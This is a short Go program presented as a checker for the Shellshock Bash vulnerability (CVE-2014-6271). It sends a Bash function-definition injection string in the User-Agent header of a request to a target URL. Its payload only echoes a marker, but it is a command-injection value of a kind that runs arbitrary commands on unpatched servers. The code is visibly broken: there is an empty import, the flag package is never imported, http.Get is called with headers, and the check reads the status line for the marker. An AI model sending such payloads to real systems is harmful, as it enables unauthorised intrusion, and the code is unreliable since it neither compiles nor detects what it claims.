// Shellshock -CVE-2014–6271- Checker
// Author: cbk914
package main

import (
	"fmt"
	"net/http"
  "strings"
  ""
)

func main() {
	// Define the target URL as a command-line argument
	url := flag.String("u", "", "Target URL")
	flag.Parse()

	// Construct the headers with the payload for the Shellshock vulnerability
	headers := map[string][]string{
		"User-Agent": {"() { :;}; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'"},
	}

	// Send the request to the target URL with the modified headers
	resp, err := http.Get(*url, headers)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	// Check the response for the payload
	if strings.Contains(resp.Status, "Vulnerable") {
		fmt.Println("Target is vulnerable to Shellshock.")
	} else {
		fmt.Println("Target is not vulnerable to Shellshock.")
	}
}
